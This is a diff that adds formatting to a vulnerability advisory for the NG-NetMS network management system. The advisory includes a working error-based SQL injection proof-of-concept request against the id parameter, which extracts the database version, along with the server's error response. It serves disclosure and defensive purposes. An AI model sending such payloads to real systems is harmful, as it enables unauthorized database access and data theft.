@@ -14,8 +14,8 @@ Opt/Net develops Next Gen Network Management System (NG-NetMS). This is a new we
 
 This product provides near real-time visibility of the networks and ITC infrastructures and interconnected computing resources.
 
-CVE: CVE-2017-xxxx
-CWE: CWE-89
+* CVE: CVE-2017-xxxx
+* CWE: CWE-89
 
 #### #Proof of Concept
 
@@ -26,7 +26,7 @@ Identified vulnerable parameters: id, id_access_type and id_attr_access.
 The following HTTP GET request allows an attacker to exploit the SQL injection vulnerability to return banner information.
 
 #### Request:
-
+{% highlight ruby %}
 GET /index.php?id=1%27%20AND%201=CAST((CHR(113)||CHR(112)||CHR(107)||CHR(122)||CHR(113))||(COALESCE(CAST(VERSION()%20AS%20CHARACTER(10000)),(CHR(32))))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(113)||CHR(113))%20AS%20NUMERIC)--%20&r=attrValue/index HTTP/1.1
 Host: a.b.c.d
 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
@@ -38,9 +38,10 @@ DNT: 1
 Connection: close
 Upgrade-Insecure-Requests: 1
 Cache-Control: no-transform
+{% endhighlight %}
 
 #### Response: 
-
+{% highlight ruby %}
 HTTP/1.1 500 Internal Server Error
 Date: Mon, 30 Oct 2017 05:25:01 GMT
 Server: Apache/2.4.7 (Ubuntu)
@@ -70,4 +71,5 @@ CDbCommand failed to execute the SQL statement: SQLSTATE[22P02]: Invalid text re
 </div>
 
 </snip>
+{% endhighlight %}
 
